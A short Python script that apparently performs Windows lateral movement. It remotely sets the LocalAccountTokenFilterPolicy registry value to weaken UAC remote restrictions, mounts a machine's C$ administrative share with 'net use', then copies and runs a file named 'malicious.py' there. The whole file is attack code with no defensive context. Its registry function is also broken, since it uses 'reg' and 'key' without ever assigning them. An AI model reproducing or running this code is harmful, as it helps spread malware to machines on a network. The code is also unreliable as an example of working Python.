import os,winreg,shutil

def enableAdminShare(computerName):
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    winreg.ConnectRegistry(computerName,winreg.HKEY_LOCAL_MACHINE)
    winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
    winreg.SetValueEx(key,"LocalAccountTokenFilterPolicy",0,winreg.REG_DWORD,1)
    # Reboot needed

def accessAdminShare(computerName,executable):
    remote = r"\\"+computerName+"\c$"
    local = "Z:"
    remotefile = local + "\\"+executable
    os.system("net use "+local+" "+remote)
    shutil.move(executable,remotefile)
    os.system("python "+remotefile)
    os.system("net use "+local+" /delete")
    

accessAdminShare(os.environ["COMPUTERNAME"],r"malicious.py")